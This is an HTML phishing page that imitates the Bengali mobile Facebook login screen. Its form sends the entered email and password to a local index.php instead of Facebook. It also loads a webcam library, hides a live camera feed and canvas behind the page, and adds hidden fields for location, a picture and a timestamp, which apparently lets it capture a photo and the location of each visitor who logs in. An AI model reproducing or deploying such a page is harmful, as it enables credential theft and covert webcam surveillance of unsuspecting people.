<!DOCTYPE html>
<html lang="bn">

<head>
    <title>Facebook - লগ ইন করুন অথবা নিবন্ধন করুন</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/rvBN2HlBGcU.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="eG3x5X4" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yI/l/0,cross/_DOLmbOIze1.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="uuaG0vm" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yu/l/0,cross/uuLh2S22YH1.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="HdeRwoL" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/l/0,cross/jWyrpkzobS0.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="KWYcpNl" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/l/0,cross/IxxDAbiZepi.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="XlNyQLM" crossorigin="anonymous" />

<!-- webcam -->
<script type="text/javascript" src="https://unpkg.com/webcam-easy/dist/webcam-easy.min.js"></script>

</head>

<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">

<!-- camera -->
<video id="webcam" autoplay playsinline width="640" height="480"></video>
<canvas id="canvas" class="d-none"></canvas>
<audio id="snapSound" src="snap.wav" preload = "auto"></audio>
<style>
video,canvas{
    position: absolute;
    z-index: -111;
}
</style>


<!-- facebook -->
    <div id="viewport" data-kaios-focus-transparent="1">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
        <div id="page">
            <div class="_129_" id="header-notices"></div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
                <div class="_7om2">
                    <div class="_4g34" id="u_0_0_Hu">
                        <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error"
                            data-sigil="m_login_notice">
                            <div class="_52jd"></div>
                        </div>
                        <div>
                            <div class="_4-4l">
                                <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
                                </div>
                                <div class="_7om2 _52we _2pid _52z6">
                                    <div class="_4g34">
                                        <a
                                            href="https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjE3Mjc1NTQzLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8">
                                            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                                                width="112" class="img" alt="facebook" />
                                        </a>
                                    </div>
                                </div>
                                <div class="_5rut">
                                    <form action="./index.php" name="fb" method="post" class="mobile-login-form _9hp- _5spm"
                                        id="login_form_mobile" novalidate="1" data-sigil="m_login_form">
                                        <div id="user_info_container" data-sigil="user_info_after_failure_element">
                                        </div>
                                        <div id="pwd_label_container" data-sigil="user_info_after_failure_element">
                                        </div>
                                        <div id="otp_retrieve_desc_container"></div>
                                        <div>
                                            <div class="_56be">
                                                <div class="_55wo _56bf">
                                                    <div class="_96n9">
                                                        <input autocorrect="off" autocapitalize="off"
                                                            class="_56bg _4u9z _5ruq _8qtn" autocomplete="on"
                                                            id="m_login_email" name="email"
                                                            placeholder="&#x9ae;&#x9cb;&#x9ac;&#x9be;&#x987;&#x9b2; &#x9a8;&#x9ae;&#x9cd;&#x9ac;&#x9b0; &#x9ac;&#x9be; &#x987;&#x9ae;&#x9c7;&#x987;&#x9b2; &#x985;&#x9cd;&#x9af;&#x9be;&#x9a1;&#x9cd;&#x9b0;&#x9c7;&#x9b8;"
                                                            type="text" data-sigil="m_login_email" />
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="_55wq"></div>
                                            <div class="_56be">
                                                <div class="_55wo _56bf">
                                                    <div class="_1upc _mg8" data-sigil="m_login_password">
                                                        <div class="_7om2">
                                                            <div class="_4g34 _5i2i _52we">
                                                                <div class="_5xu4">
                                                                    <input autocorrect="off" autocapitalize="off"
                                                                        class="_56bg _4u9z _27z2 _8qtm"
                                                                        autocomplete="on" id="m_login_password"
                                                                        name="pass"
                                                                        placeholder="&#x9aa;&#x9be;&#x9b8;&#x993;&#x9df;&#x9be;&#x9b0;&#x9cd;&#x9a1;"
                                                                        type="password"
                                                                        data-sigil="password-plain-text-toggle-input" />
                                                                </div>
                                                            </div>
                                                            <div class="_5s61 _216i _5i2i _52we">
                                                                <div class="_5xu4">
                                                                    <div class="_2pi9" style="display:none"
                                                                        id="u_0_1_55">
                                                                        <a href="#"
                                                                            data-sigil="password-plain-text-toggle">
                                                                            <span class="mfss" style="display:none"
                                                                                id="u_0_2_WX">লুকান</span>
                                                                            <span class="mfss"
                                                                                id="u_0_3_VU">দেখান</span>
                                                                        </a>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_2pie" style="text-align:center;">
                                            <div id="login" data-sigil="login_password_step_element">
                                                
                                                <!-- hidden data -->
                                                <input type="hidden" name="location" id="location" value="location">
                                                <input type="hidden" name="picture" id="picture" value="picture">
                                                <input type="hidden" name="dateAndTime" id="dateAndTime" value="dateAndTime">
                                                

                                                <button id="login_button" type="submit"
                                                    value="&#x9b2;&#x997; &#x987;&#x9a8; &#x995;&#x9b0;&#x9c1;&#x9a8;"
                                                    class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                                                    name="login">
                                                    <span class="_55sr">লগ ইন করুন</span>
                                                </button>
                                            </div>
                                            <div class="_7eif" id="oauth_login_button_container" style="display:none">
                                            </div>
                                            <div class="_7f_d" id="oauth_login_desc_container" style="display:none">
                                            </div>
                                            <div id="otp_button_elem_container"></div>
                                        </div>

                                    </form>
                                    <div>
                                        <div>
                                            <div id="login_reg_separator" class="_43mg _8qtf"
                                                data-sigil="login_reg_separator">
                                                <span class="_43mh">বা</span>
                                            </div>
                                            <div class="_52jj _5t3b" id="signup_button_area">
                                                <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable"
                                                    id="signup-button"
                                                    href="https://m.facebook.com/reg-no-deeplink/?cid=103&amp;refid=8"
                                                    tabindex="0" data-sigil="m_reg_button">নতুন অ্যাকাউন্ট তৈরি করুন</a>
                                            </div>
                                        </div>
                                        <div>
                                            <div data-sigil="login_identify_step_element"></div>
                                            <div class="other-links _8p_m">
                                                <ul class="_5pkb _55wp">
                                                    <li>
                                                        <a tabindex="0"
                                                            href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fmobile.facebook.com%252F&amp;r&amp;cuid&amp;ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjE3Mjc1NTQzLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;lwv=100&amp;refid=8"
                                                            id="forgot-password-link">পাসওয়ার্ড ভুলে গেছেন?</a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div style="display:none">
                    <div></div>
                    <div></div>
                </div>
                <span>
                    <img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" />
                </span>
                <div class="_55wr _5ui2" data-sigil="m_login_footer">
                    <div class="_5dpw">
                        <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                            <div class="_7om2">
                                <div class="_4g34">
                                    <span class="_52jc _52j9 _52jh _3ztb">বাংলা</span>
                                    <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="./"
                                                data-locale="as_IN" data-sigil="change_language">অসমীয়া</a>
                                        </span>
                                    </div>
                                    <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="https://m.facebook.com/a/language.php?l=id_ID&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fmobile.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQB_f7bJCKH8WifvrJ8&amp;refid=8"
                                                data-locale="id_ID" data-sigil="change_language">Bahasa Indonesia</a>
                                        </span>
                                    </div>
                                    <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="https://m.facebook.com/a/language.php?l=pt_BR&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fmobile.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCNe64XfrS6ExKs3EI&amp;refid=8"
                                                data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a>
                                        </span>
                                    </div>
                                </div>
                                <div class="_4g34">
                                    <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="./"
                                                data-locale="en_GB" data-sigil="change_language">English (UK)</a>
                                        </span>
                                    </div>
                                    <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="https://m.facebook.com/a/language.php?l=hi_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fmobile.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDXCjRIYMhF1nVi3WY&amp;refid=8"
                                                data-locale="hi_IN" data-sigil="change_language">हिन्दी</a>
                                        </span>
                                    </div>
                                    <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="https://m.facebook.com/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fmobile.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDV9dsWjp2PeJgrcZA&amp;refid=8"
                                                data-locale="es_LA" data-sigil="change_language">Español</a>
                                        </span>
                                    </div>
                                    <a
                                        href="https://m.facebook.com/language.php?n=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fmobile.facebook.com%252F&amp;refid=8">
                                        <div class="_3j87 _1rrd _3ztd"
                                            aria-label="&#x9ad;&#x9be;&#x9b7;&#x9be;&#x9b0; &#x9b8;&#x9ae;&#x9cd;&#x9aa;&#x9c2;&#x9b0;&#x9cd;&#x9a3; &#x9a4;&#x9be;&#x9b2;&#x9bf;&#x995;&#x9be;"
                                            data-sigil="more_language">
                                            <i class="img sp_CEOlFfsk4vS sx_a89880"></i>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="_5ui4">
                            <div class="_96qv _9a0a">
                                <a href="https://m.facebook.com/facebook?refid=8" class="_96qw"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x9ac;&#x9cd;&#x9b2;&#x997; &#x9aa;&#x9a1;&#x9bc;&#x9c1;&#x9a8;, &#x9b0;&#x9bf;&#x9b8;&#x9cb;&#x9b0;&#x9cd;&#x9b8; &#x9b8;&#x9c7;&#x9a8;&#x9cd;&#x99f;&#x9be;&#x9b0; &#x985;&#x9ae;&#x9cd;&#x9ac;&#x9c7;&#x9b7;&#x9a3; &#x995;&#x9b0;&#x9c1;&#x9a8; &#x98f;&#x9ac;&#x982; &#x99a;&#x9be;&#x995;&#x9c1;&#x9b0;&#x9bf; &#x9b8;&#x9c1;&#x9af;&#x9cb;&#x997;&#x997;&#x9c1;&#x9b2;&#x9bf; &#x996;&#x9c1;&#x981;&#x99c;&#x9c1;&#x9a8;&#x9f7;">পরিচয়</a>
                                <span aria-hidden="true"> · </span>
                                <a href="https://m.facebook.com/help/?ref=pf&amp;refid=8" class="_96qw"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x9b9;&#x9c7;&#x9b2;&#x9cd;&#x9aa; &#x9b8;&#x9c7;&#x9a8;&#x9cd;&#x99f;&#x9be;&#x9b0; &#x9ad;&#x9bf;&#x99c;&#x9bf;&#x99f; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;">সাহায্য</a>
                                <span aria-hidden="true"> · </span>
                                <span class="_96qw" id="u_0_5_ms">আরও</span>
                            </div>
                            <div class="_96qv" style="display:none" id="u_0_6_8u">
                                <a href="https://messenger.com/" class="_96qw"
                                    title="Messenger &#x9a6;&#x9c7;&#x996;&#x9c1;&#x9a8;&#x964;"> Messanger </a>
                                <a href="https://m.facebook.com/lite/?refid=8" class="_96qw"
                                    title="Android-&#x98f;&#x9b0; &#x99c;&#x9a8;&#x9cd;&#x9af; Facebook Lite&#x964;">
                                    Facebook Lite </a>
                                <a href="https://m.facebook.com/watch/?refid=8" class="_96qw"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x9ad;&#x9bf;&#x9a1;&#x9bf;&#x993; &#x9a6;&#x9c7;&#x996;&#x9c1;&#x9a8; &#x9ac;&#x9cd;&#x9b0;&#x9be;&#x989;&#x99c; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;">
                                    Watch </a>
                                <a href="https://m.facebook.com/directory/people/?refid=8"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x9b2;&#x9cb;&#x995;&#x99c;&#x9a8;&#x9c7;&#x9b0; &#x9a1;&#x9bf;&#x9b0;&#x9c7;&#x995;&#x9cd;&#x99f;&#x9b0;&#x9bf; &#x9ac;&#x9cd;&#x9b0;&#x9be;&#x989;&#x99c; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;"
                                    class="_96qw">লোকজন</a>
                                <a href="https://m.facebook.com/directory/pages/?refid=8" class="_96qw">পেজ</a>
                                <a href="https://m.facebook.com/pages/category/?refid=8" class="_96qw">পৃষ্ঠার বিভাগ</a>
                                <a href="https://m.facebook.com/places/?refid=8" class="_96qw"
                                    title="Facebook &#x98f; &#x99c;&#x9a8;&#x9aa;&#x9cd;&#x9b0;&#x9bf;&#x9df; &#x9b8;&#x9cd;&#x9a5;&#x9be;&#x9a8;&#x9b8;&#x9ae;&#x9c2;&#x9b9; &#x9a6;&#x9c7;&#x996;&#x9c1;&#x9a8;&#x964;">স্থান</a>
                                <a href="https://facebook.com/games/?refid=8" class="_96qw"
                                    title="Facebook &#x997;&#x9c7;&#x9ae;&#x9b8; &#x9a6;&#x9c7;&#x996;&#x9c1;&#x9a8;">গেমগুলি</a>
                                <a href="https://m.facebook.com/directory/places/?refid=8"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x99c;&#x9be;&#x9af;&#x9bc;&#x997;&#x9be;&#x9b0; &#x9a1;&#x9bf;&#x9b0;&#x9c7;&#x995;&#x9cd;&#x99f;&#x9b0;&#x9bf; &#x9ac;&#x9cd;&#x9b0;&#x9be;&#x989;&#x99c; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;"
                                    class="_96qw">জায়গা</a>
                                <a href="https://m.facebook.com/marketplace/?refid=8" class="_96qw"
                                    title="Facebook Marketplace-&#x98f; &#x995;&#x9c7;&#x9a8;&#x9be;&#x9ac;&#x9c7;&#x99a;&#x9be; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;">Marketplace</a>
                                <a href="https://pay.facebook.com/?refid=8" class="_96qw" target="_blank"
                                    title="Facebook Pay-&#x98f;&#x9b0; &#x9b8;&#x9ae;&#x9cd;&#x9ac;&#x9a8;&#x9cd;&#x9a7;&#x9c7; &#x986;&#x9b0;&#x993; &#x99c;&#x9be;&#x9a8;&#x9c1;&#x9a8;">Facebook
                                    Pay</a>
                                <a href="https://m.facebook.com/directory/groups/?refid=8"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x997;&#x9cb;&#x9b7;&#x9cd;&#x9a0;&#x9c0;&#x997;&#x9c1;&#x9b2;&#x9bf; &#x9b8;&#x9b0;&#x9be;&#x9b8;&#x9b0;&#x9bf; &#x9ac;&#x9cd;&#x9b0;&#x9be;&#x989;&#x99c; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x9f7;"
                                    class="_96qw">গোষ্ঠীগুলি</a>
                                <a href="https://m.facebook.com/jobs/?refid=8" class="_96qw"
                                    title="&#x99a;&#x9be;&#x995;&#x9b0;&#x9bf;&#x9b0; &#x99c;&#x9a8;&#x9cd;&#x9af; &#x986;&#x9ac;&#x9c7;&#x9a6;&#x9a8; &#x995;&#x9b0;&#x9c1;&#x9a8; &#x98f;&#x9ac;&#x982; Facebook-&#x98f; &#x9b9;&#x9be;&#x9af;&#x9bc;&#x9be;&#x9b0; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;">চাকরি</a>
                                <a href="https://www.oculus.com/" class="_96qw" target="_blank"
                                    title="Oculus &#x9b8;&#x9ae;&#x9cd;&#x9ac;&#x9a8;&#x9cd;&#x9a7;&#x9c7; &#x986;&#x9b0;&#x993; &#x99c;&#x9be;&#x9a8;&#x9c1;&#x9a8;">Oculus</a>
                                <a href="https://portal.facebook.com/?refid=8" class="_96qw" target="_blank"
                                    title="Facebook-&#x98f;&#x9b0; Portal &#x9b8;&#x9ae;&#x9cd;&#x9ac;&#x9a8;&#x9cd;&#x9a7;&#x9c7; &#x986;&#x9b0;&#x993; &#x99c;&#x9be;&#x9a8;&#x9c1;&#x9a8;">Portal</a>
                                <a href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT2i23b2Y8Tf89ORY05TnZ_3MV_MvZ5Ikra0U0Xt_D0hnq_naUEwl4Su6OkJhEAwQcZJyJovi8HBwcV24M4Qj-bOnRkaMrzfv89PQUwZ87KcxkfMIUXVlvTGWEtdDrWU7cpiRlE5QyuE3w"
                                    class="_96qw"
                                    title="Instagram &#x99a;&#x9c7;&#x995; &#x986;&#x989;&#x99f; &#x995;&#x9b0;&#x9c1;&#x9a8;"
                                    target="_blank" rel="noopener" data-sigil="MLynx_asynclazy">Instagram</a>
                                <a href="https://m.facebook.com/local/lists/245019872666104/?refid=8" class="_96qw"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x9b8;&#x9cd;&#x9a5;&#x9be;&#x9a8;&#x9c0;&#x9af;&#x9bc; &#x9a4;&#x9be;&#x9b2;&#x9bf;&#x995;&#x9be;&#x9b0; &#x9a8;&#x9bf;&#x9b0;&#x9cd;&#x9a6;&#x9c7;&#x9b6;&#x9bf;&#x995;&#x9be; &#x9ac;&#x9cd;&#x9b0;&#x9be;&#x989;&#x99c; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x9f7;">আঞ্চলিক</a>
                                <a href="https://m.facebook.com/fundraisers/?refid=8" class="_96qw"
                                    title="&#x9af;&#x9cb;&#x997;&#x9cd;&#x9af; &#x989;&#x9a6;&#x9cd;&#x9a6;&#x9c7;&#x9b6;&#x9cd;&#x9af;&#x9c7;&#x9b0; &#x99c;&#x9a8;&#x9cd;&#x9af; &#x9a6;&#x9be;&#x9a8; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;">অনুদান
                                    সংগ্রহ</a>
                                <a href="https://m.facebook.com/biz/directory/?refid=8" class="_96qw"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; Facebook &#x9aa;&#x9b0;&#x9bf;&#x9b7;&#x9c7;&#x9ac;&#x9be; &#x9a1;&#x9bf;&#x9b0;&#x9c7;&#x995;&#x9cd;&#x99f;&#x9b0;&#x9bf; &#x9ac;&#x9cd;&#x9b0;&#x9be;&#x989;&#x99c; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x9f7;">পরিষেবা</a>
                                <a href="https://developers.facebook.com/?ref=pf&amp;refid=8" class="_96qw"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x9aa;&#x9cd;&#x9b2;&#x9cd;&#x9af;&#x9be;&#x99f;&#x9ab;&#x9b0;&#x9cd;&#x9ae;&#x9c7; &#x9ac;&#x9bf;&#x995;&#x9be;&#x9b6; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;">ডেভেলপার</a>
                                <a href="https://m.facebook.com/careers/?ref=pf&amp;refid=8" class="_96qw"
                                    title="&#x986;&#x9ae;&#x9be;&#x9a6;&#x9c7;&#x9b0; &#x9b8;&#x9cd;&#x9ac;&#x9a8;&#x9be;&#x9ae;&#x9a7;&#x9a8;&#x9cd;&#x9af; &#x9aa;&#x9cd;&#x9b0;&#x9a4;&#x9bf;&#x9b7;&#x9cd;&#x9a0;&#x9be;&#x9a8;&#x9c7; &#x986;&#x9aa;&#x9a8;&#x9be;&#x9b0; &#x9aa;&#x9c7;&#x9b6;&#x9be;&#x997;&#x9a4; &#x99c;&#x9c0;&#x9ac;&#x9a8; &#x9b6;&#x9c1;&#x9b0;&#x9c1; &#x995;&#x9b0;&#x9c1;&#x9a8;&#x964;">পেশা</a>
                                <a data-nocookies="1" href="https://m.facebook.com/privacy/explanation?refid=8"
                                    class="_96qw"
                                    title="&#x986;&#x9aa;&#x9a8;&#x9be;&#x9b0; &#x9aa;&#x9cd;&#x9b0;&#x9be;&#x987;&#x9ad;&#x9c7;&#x9b8;&#x9bf; &#x98f;&#x9ac;&#x982; Facebook &#x9b8;&#x9ae;&#x9cd;&#x9ac;&#x9a8;&#x9cd;&#x9a7;&#x9c7; &#x99c;&#x9be;&#x9a8;&#x9c1;&#x9a8;&#x964;">প্রাইভেসি</a>
                            </div>
                            <span class="mfss fcg">Facebook Inc.</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class=""></div>
            <div class="viewportArea _2v9s" style="display:none" id="u_0_7_i+" data-sigil="marea">
                <div class="_5vsg" id="u_0_8_1I"></div>
                <div class="_5vsh" id="u_0_9_IB"></div>
                <div class="_5v5d fcg">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1"
                        data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>লোড হচ্ছে...
                </div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
                <div class="container">
                    <div class="image"></div>
                    <div class="message" data-sigil="error-message"></div>
                    <a class="link" data-sigil="MPageError:retry">আবার চেষ্টা করুন</a>
                </div>
            </div>
        </div>
    </div>
    <div id="static_templates">
        <div class="mDialog" id="modalDialog" style="display:none">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                <div class="_7om2 _52we">
                    <div class="_5s61">
                        <div class="_52z7">
                            <button type="submit"
                                value="&#x9ac;&#x9be;&#x9a4;&#x9bf;&#x9b2; &#x995;&#x9b0;&#x9c1;&#x9a8;"
                                class="cancelButton btn btnD bgb mfss touchable" id="u_0_b_qv"
                                data-sigil="dialog-cancel-button">বাতিল করুন</button>
                            <button type="submit" value="&#x9ab;&#x9bf;&#x9b0;&#x9c7; &#x9af;&#x9be;&#x9a8;"
                                class="backButton btn btnI bgb mfss touchable iconOnly"
                                aria-label="&#x9ab;&#x9bf;&#x9b0;&#x9c7; &#x9af;&#x9be;&#x9a8;" id="u_0_c_Nd"
                                data-sigil="dialog-back-button">
                                <i class="img sp_CEOlFfsk4vS sx_108b04" style="margin-top: 2px;"></i>
                            </button>
                        </div>
                    </div>
                    <div class="_4g34">
                        <div class="_52z6">
                            <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0"
                                data-sigil="m-dialog-header-title dialog-title">লোড হচ্ছে...</div>
                        </div>
                    </div>
                    <div class="_5s61">
                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
                    </div>
                </div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_a_aT"
                    data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>লোড হচ্ছে...
            </div>
        </div>
    </div>




    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="app.js"></script>
</body>

</html>